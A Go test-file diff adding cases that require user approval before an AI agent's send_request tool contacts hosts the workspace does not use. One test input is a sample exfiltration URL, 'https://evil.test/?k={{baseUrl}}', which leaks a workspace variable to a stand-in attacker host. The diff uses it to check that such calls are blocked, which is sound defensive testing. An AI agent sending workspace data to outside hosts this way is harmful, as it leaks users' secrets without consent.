@@ -119,8 +119,11 @@ func TestAgentPolicyAsksOnlyForUnsafeMethodsAndWrites(t *testing.T) {
 		{"run_request", `{"request":"Smoke/Ok"}`, model.AgentToolRun, false},
 		{"run_request", `{"request":"Smoke/Chain"}`, model.AgentToolRun, true},
 		{"run_collection", `{"collection":"Smoke"}`, model.AgentToolRun, true},
-		{"send_request", `{"url":"http://example.test"}`, model.AgentToolRun, false},
-		{"send_request", `{"method":"options","url":"http://example.test"}`, model.AgentToolRun, false},
+		{"send_request", `{"url":"{{baseUrl}}/health"}`, model.AgentToolRun, false},
+		{"send_request", `{"method":"options","url":"http://127.0.0.1:1/health"}`, model.AgentToolRun, false},
+		{"send_request", `{"url":"http://example.test"}`, model.AgentToolRun, true},
+		{"send_request", `{"url":"https://evil.test/?k={{baseUrl}}"}`, model.AgentToolRun, true},
+		{"send_request", `{"url":"{{unknownHost}}/x"}`, model.AgentToolRun, true},
 		{"send_request", `{"method":"DELETE","url":"http://example.test"}`, model.AgentToolRun, true},
 		{"save_request", `{"name":"x"}`, model.AgentToolWrite, true},
 		{"patch_request", `{"request":"x","patch":{"name":"y"}}`, model.AgentToolWrite, true},
@@ -307,6 +310,31 @@ func TestAgentBridgeAsksBeforeSendingUnsafeMethods(t *testing.T) {
 	}
 	if text, isError := agentBridgeCall(t, bridge, "run_request", map[string]any{"request": "Smoke/Ok"}); isError || hits.Load() != 2 || approvals.count() != 2 {
 		t.Fatalf("GET must run at once: %v %s hits=%d approvals=%d", isError, text, hits.Load(), approvals.count())
+	}
+}
+
+func TestAgentBridgeAsksBeforeSendingToAHostTheWorkspaceDoesNotUse(t *testing.T) {
+	useTempConfigDir(t, t.TempDir())
+	server, hits := countingServer(t)
+	other, otherHits := countingServer(t)
+	root := agentTestWorkspace(t, server.URL)
+	otherURL := strings.Replace(other.URL, "127.0.0.1", "localhost", 1)
+	bridge, approvals := newTestAgentBridge(t, root, model.AgentApprovalReject)
+
+	if text, isError := agentBridgeCall(t, bridge, "send_request", map[string]any{"url": "{{baseUrl}}/health"}); isError || hits.Load() != 1 || approvals.count() != 0 {
+		t.Fatalf("GET to a workspace host = %v %s hits=%d approvals=%d", isError, text, hits.Load(), approvals.count())
+	}
+	text, isError := agentBridgeCall(t, bridge, "send_request", map[string]any{"url": otherURL + "/?k={{baseUrl}}"})
+	if !isError || !strings.Contains(text, "declined") || otherHits.Load() != 0 || approvals.count() != 1 {
+		t.Fatalf("GET to another host = %v %s hits=%d approvals=%d", isError, text, otherHits.Load(), approvals.count())
+	}
+	if reason := approvals.last().Reason; !strings.Contains(reason, "localhost") {
+		t.Fatalf("reason = %q", reason)
+	}
+
+	bridge.setChat(model.AgentChat{AllowedHosts: []string{"localhost"}}, nil)
+	if text, isError := agentBridgeCall(t, bridge, "send_request", map[string]any{"url": otherURL + "/ok"}); isError || otherHits.Load() != 1 || approvals.count() != 1 {
+		t.Fatalf("GET to a trusted host = %v %s hits=%d approvals=%d", isError, text, otherHits.Load(), approvals.count())
 	}
 }
 
